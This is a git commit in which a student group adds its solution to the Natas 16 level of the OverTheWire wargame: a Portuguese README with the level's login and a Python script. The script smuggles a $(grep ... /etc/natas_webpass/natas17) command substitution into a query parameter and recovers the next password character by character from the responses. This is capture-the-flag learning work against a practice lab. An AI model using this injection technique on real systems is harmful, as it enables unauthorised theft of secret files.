8e83fe40421dedfb84778c404ffe647397d9a33c
João Victor Mendes <mendesjoaovic@gmail.com>
2021-06-25 14:20:04 -0300

    Added Challenge 2 solution

---
+++ Challenge 2/README.md
@@ -0,0 +1,8 @@
+# Challenge 2: Natas 16
+
+A descrição original do desafio pode ser encontrada [aqui](http://natas16.natas.labs.overthewire.org/). O usuário é `natas16` senha inicial (do challenge 15) é `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`.
+
+## Grupo
+- [Guilherme Locca Salomão](https://github.com/Caotichazard), 758569
+- [João Victor Mendes Freire](https://github.com/joaovicmendes), 758943
+- [Martin Heckmann](https://github.com/heckmartin), 758986
---
+++ Challenge 2/natas16.py
@@ -0,0 +1,24 @@
+import requests, string
+
+base_url = "http://natas16.natas.labs.overthewire.org"
+auth_username = "natas16"
+auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+
+# Lista de caracteres a serem testados
+characters = ''.join([string.ascii_letters,string.digits])
+
+def check_password(starting_password=''):
+    for character in characters:
+        possible_password = starting_password
+        possible_password += character
+
+        uri = "{0}?needle=$(grep -E ^{1}.* /etc/natas_webpass/natas17)hackers".format(base_url,possible_password)
+        res = requests.get(uri, auth=(auth_username,auth_password))
+
+        if 'hackers' not in res.text:
+            print(possible_password)
+            check_password(possible_password)
+            break
+        pass
+
+print(check_password())
